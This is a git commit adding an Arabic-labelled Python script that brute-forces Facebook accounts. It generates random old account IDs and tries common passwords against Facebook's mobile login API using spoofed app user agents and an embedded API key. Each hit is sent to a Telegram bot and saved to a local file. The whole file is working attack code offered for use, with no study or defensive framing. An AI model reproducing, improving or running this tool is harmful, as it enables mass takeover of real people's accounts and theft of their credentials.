8c9bee88340f4d3c8768a542a7e7699575d66632
pubgcvb780-pixel <pubgcvb780@gmail.com>
2026-04-15 21:49:11 +0300

    Add files via upload

---
+++ هدية من امير السوري بدون تشفير (1).py
@@ -0,0 +1,282 @@
+from ast import Pass
+from os import name, path
+import os,base64,zlib,pip,urllib
+from weakref import proxy
+import os,base64,zlib,platform
+from urllib.request import parse_http_list
+os.system("pip install requests")
+from bs4 import BeautifulSoup as sop
+try:
+    from bs4 import BeautifulSoup as bsp
+except:
+    os.system('pip install bs4')
+    from bs4 import BeautifulSoup as bsp
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        print('\n Installing missing modules ...')
+        os.system('python s1n.py')  
+        os.system('clear')
+        
+####### MODL KILLER #######
+from requests import api
+x = open(api.__file__,'r').read()
+if "print" in x:
+    os.system('clear')
+elif "sys.stdout.write" in x:
+    os.system('clear')
+else:
+    pass
+from requests import sessions
+ 
+x = open(sessions.__file__,'r').read()
+if "print" in x:
+    os.system('clear')
+elif "sys.stdout.write" in x:
+    os.system('clear')
+else:
+    pass
+from requests import models
+x = open(models.__file__,'r').read()
+if "print" in x:
+    os.system('clear')
+ 
+elif "sys.stdout.write" in x:
+    os.system('clear')
+else:
+    pass
+#__________NEW IDX UA_____________#
+print('\x1b[38;5;196m  ادخل توكن بوتك');token = input(' TOKEN BOT  : ')
+print('  ادخل ايدي بوتك ');ID=input(' Telegram ID : ');rd = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text= ').text
+def amir2():
+ a = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/487.1.0.74.74;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/456417358;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
+ b = "[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235247;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/235412020;FBCR/airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1893;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"Mozilla/5.0 (Linux; Android 13; Infinix X6525B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.107 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/434.0.0.2.99;FBCX/modulariab;]"
+ M1= a + b
+ return M1
+    #__________NEW IDX UA_____________#
+def amir1():
+    en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
+    kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
+    fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
+    s=  "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"Mozilla/5.0 (Linux; Android 13; Infinix X6525B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.108 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/475.1.0.46.82;]"+"Mozilla/5.0 (Linux; Android 12; Infinix X676C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.46 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/490.0.0.63.82;]"+"Mozilla/5.0 (Linux; Android 13; Infinix X678B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/448.0.0.30.115;]"
+    e = "[FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/MTN;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]"+"Mozilla/5.0 (Linux; Android 14; Infinix X6711 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.46 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/490.0.0.63.82;IABMV/1;]"+"Mozilla/5.0 (Linux; Android 13; Infinix X6731B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.46 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/490.0.0.63.82;]"+"Mozilla/5.0 (Linux; Android 14; Infinix X678B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.119 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/489.0.0.66.81;]"
+    ua = s + e
+    return ua
+    
+import os, platform, time, sys
+
+# تعريف الدوال المفقودة
+def __LINE__():
+    print("\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;97m")
+
+def clr():
+    os.system('clear')
+
+# تعريف المتغيرات المفقودة
+version = "1.0"
+__date__ = time.strftime("%Y-%m-%d")
+
+time.sleep(1)
+os.system('clear')
+##
+import os, platform, time, sys
+
+try:
+ import requests
+except:os.system("pip uninstall requests -y;pip install requests")
+
+print('\033[1;31m[\033[1;97m-\033[1;31m] \033[1;91mChecking For Update. . . .')
+time.sleep(2)
+os.system('git pull --quiet 2>/dev/null')
+bit = platform.architecture()[0]
+if bit == '64bit':
+    pass
+
+def clear():
+    os.system('clear')
+    print(logo)
+#[===================MODULE======================]#
+import os,sys,uuid,requests,time
+from concurrent.futures import ThreadPoolExecutor as ArAfat
+from os import system as axp
+from random import randint as aRaft
+from random import choice as race
+from string import digits as digits
+#[===================COLORS======================]#
+
+
+#[===================LOOP======================]#
+loop, ok = 0, 0
+user = []
+R = "\033[1;31m"   # أحمر
+B = "\033[1;34m"   # أزرق
+P = "\033[1;35m"   # وردي
+W = "\x1b[38;5;15m" # أبيض
+X = "\x1b[38;5;205m" # وردي فاتح
+
+#----------------<-STYLE->----------------#
+xp = f"{R}<[{W}●{R}]>{W}"
+xp1 = f"{R}<[{W}1{R}]>{W}"
+xp2 = f"{R}<[{W}2{R}]>{W}"
+xp3 = f"{R}<[{W}3{R}]>{W}"
+xp4 = f"{R}<[{W}4{R}]>{W}"
+xp5 = f"{R}<[{W}5{R}]>{W}"
+xp0 = f"{R}<[{W}0{R}]>{W}"
+xpx = f"{R}<[{W}?{R}]>{W}"
+xpxx = f"{R}>{W}>{R}>{W}"
+
+logo = f"""
+{R}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+{R}⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
+{R}⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
+{R}⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
+{R}⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
+{R}⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
+{R}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
+{R}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
+{R}⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
+{R}⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
+{R}⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
+{R}⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
+{R}╭━━━┳━━━╮
+{R}┃╭━╮┃╭━╮┃
+{R}┃╰━╯┃╰━━╮
+{R}┃╭━━┻━━╮┃
+{R}┃┃╱╱┃╰━╯┃
+{R}╰╯╱╱╰━━━╯
+{R}DEVELOPER ● PS > @p7s7s
+{R}STATUS  ● Premium")
+{R}FUTURES  FILE // CLONE
+{R} DEV • PS ~ p7s7s
+"""
+
+#[===================CLEAR======================]#
+def clear():
+    axp("clear")
+    print(logo)
+def animation(u):
+    for e in u + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.001)
+def linex():
+    animation(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
+#[===================UA-BOX======================]#
+def amir():
+    return "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/28.0.0.1.16;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/6811796;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
+#[===================MAIN-MENU======================]#
+def main():
+    clear()
+    linex()
+    print(f"{W}❨{R}[1]{W}❩{B} OLD CLONE 2009-2014\n{W}❨{R}[2]{W}❩{R} EXIT")
+    linex()
+    frsc = input(f"{W}❨{R}{W}❩{B} CHOICE : ")
+    if frsc == "1":
+        settings()
+    if frsc == "2":
+        clear()
+        print(f"{W}❨{R}●{W}❩{B} TOOLS EXIT ")
+        os.system("exit")
+        
+def settings():
+    linex()
+    animation(f"{W}❨{R}●{W}❩{B} EXAMPLE {P}❯ {B} 10000 / 20000 / 30000 / 40000")
+    linex()
+    limit = int(input(f"{W}❨{R}●{W}❩{B} ENTER  LIMIT {P}❯ {B}"))
+    linex()
+    for _ in range(limit):
+        arf = ''.join(race(digits) for _ in range(10))
+        user.append(arf)    
+    with ArAfat(max_workers=30) as ablxXudina:
+        total = str(len(user))
+        clear()
+        linex()
+        animation(f"{W}❨{R}●{W}❩{B} TOTAL LIMIT {P}❯ {B}%s" % (total))
+        linex()
+        animation(f"{W}❨{R}●{W}❩{B} IF NO RESULT THAN TRY VPN")
+        linex()
+        for xd in user:
+            uid = str("10000" + xd)
+            pas = ['123456789','123456','00000','1234567']
+            ablxXudina.submit(FBOLDIDSFUCKER, uid, pas, total)    
+    print()
+    linex()
+    print(f"{W}❨{R}●{W}❩{B} PROCESS COMPLETE \n{W}❨{R}●{W}❩{B} TOTAL OK {P}❯ {B}%s" % (ok))
+    linex()
+    input(f"{W}❨{R}●{W}❩{B} ENTER TO GET MENU ")
+    exit()
+#[===================LOGO======================]#
+def FBOLDIDSFUCKER(uid, pas, tl):
+    global loop, ok
+    sys.stdout.write(f"\r\r{W}❨{R}●{W}❩{B}[OK]{W}❨{R}@p7s7s{W}❩{B} %s {W}❨{R}●{W}❩{B} OK {B} %s "%(loop,ok))
+    sys.stdout.flush()    
+    try:
+        for ps in pas:
+            with requests.Session() as session:
+                data = {
+                    'adid': str(uuid.uuid4()),
+                    'email': uid,
+                    'password': ps,
+                    'cpl': 'true',
+                    'credentials_type': 'device_based_login_password',
+                    'source': 'device_based_login',
+                    'error_detail_type': 'button_with_disabled',
+                    'format': 'json',
+                    'generate_session_cookies': '1',
+                    'generate_analytics_claim': '1',
+                    'generate_machine_id': '1',
+                    "family_device_id": str(uuid.uuid4()),
+                    "advertiser_id": str(uuid.uuid4()),
+                    "locale": "en_US",
+                    "client_country_code": "US",
+                    "device_id": str(uuid.uuid4()),
+                    "method": "auth.login",
+                    "api_key": "882a8490361da98702bf97a021ddc14d",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
+                }
+                head = {
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'Host': 'graph.facebook.com',
+                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                    'user-agent': amir(),
+                    'accept-encoding': 'gzip, deflate',
+                    'x-fb-http-engine': 'Liger'
+                }
+                url = "https://b-api.facebook.com/auth/login"
+                response = session.post(url, data=data, headers=head, verify=True).json()
+                if "access_token" in response:
+                    print(f"\n{B}[ @p7s7s OK ] {B}{uid} {R}● {B}{ps}");tlg = f'''❲ ⚜️ VIP ACCOUNT DROP ⚜️ ❳
+━━━━━━━━━━━━━━━━━━
+ منصة : Facebook
+ تاريخ التسجيل : 2009 + 2014
+ UID : {uid}
+ PASS : {ps}
+━━━━━━━━━━━━━━━━━━
+ Developer : @p7s7s
+↳
+━━━━━━━━━━━━━━━━━━''';requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))
+                    open("/sdcard/amir.txt", "a").write(uid + "|" + ps + "\n")
+                    ok+=1
+                    break
+                elif "www.facebook.com" in response.get("error", {}).get("message", ""):
+                    print(f"\n{B}[ @p7s7s OK ] {B}{uid} {R}● {B}{ps}");tlg = f'''❲ ⚜️ VIP ACCOUNT DROP ⚜️ ❳
+━━━━━━━━━━━━━━━━━━
+ منصة : Facebook
+ تاريخ التسجيل : 2009 + 2014
+ UID : {uid}
+ PASS : {ps}
+━━━━━━━━━━━━━━━━━━
+ Developer : @p7s7s
+Telegram Channels :
+↳
+━━━━━━━━━━━━━━━━━━
+''';requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg))        
+                    open("/sdcard/amir.txt", "a").write(uid + "|" + ps + "\n")
+                    break
+        loop+=1
+    except Exception as e:
+        pass
+main()
